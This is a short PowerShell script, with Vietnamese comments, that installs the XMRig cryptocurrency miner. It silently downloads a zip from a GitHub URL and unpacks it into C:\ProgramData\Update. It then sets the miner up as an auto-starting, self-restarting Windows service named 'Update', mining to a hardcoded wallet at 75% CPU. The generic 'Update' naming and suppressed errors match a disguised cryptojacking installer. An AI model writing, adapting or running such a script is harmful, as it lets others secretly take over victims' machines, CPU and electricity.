# install_xmrig.ps1
$ErrorActionPreference = "SilentlyContinue"

# Link tải ToolApp.zip (có xmrig.exe + nssm.exe)
$DownloadUrl = "https://github.com/RVMODDEPZAI/tooltestskibidi/raw/refs/heads/main/ToolApp.zip"
$InstallDir  = "C:\ProgramData\Update"
$ZipPath     = "$env:TEMP\ToolApp.zip"
$XMRigPath   = Join-Path $InstallDir "xmrig.exe"
$NssmPath    = Join-Path $InstallDir "nssm.exe"
$RunBat      = Join-Path $InstallDir "run_xmrig.bat"

$Pool        = "pool.minexmr.com:4444"
$Wallet      = "iQa8XCLYjRXCg5moijr3Ha74K67rDZJtJxTW1YwwPwn"

# 1. Tạo thư mục cài đặt
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir | Out-Null
}

# 2. Tải zip về
Write-Host "Đang tải ToolApp.zip..."
Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath

# 3. Giải nén
Write-Host "Đang giải nén..."
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force

# 4. Tạo file run_xmrig.bat với donate=0 và max 75% CPU
$BatContent = @"
@echo off
cd /d "$InstallDir"
"$XMRigPath" -o $Pool -u $Wallet -p %COMPUTERNAME%-miner -k --donate-level=0 --max-cpu-usage=75 --cpu-priority=3
"@
Set-Content -Path $RunBat -Value $BatContent -Encoding ASCII
Write-Host "Đã tạo: $RunBat"

# 5. Cài service 'Update' trỏ tới file bat
Write-Host "Cài service 'Update'..."
& $NssmPath remove Update confirm
& $NssmPath install Update $RunBat
& $NssmPath set Update Start SERVICE_AUTO_START
& $NssmPath set Update AppRestartDelay 10000

# 6. Khởi động service
Write-Host "Khởi động service..."
net start Update

Write-Host "Hoàn tất! Service 'Update' đã cài và chạy tự động với donate=0, CPU~75%."
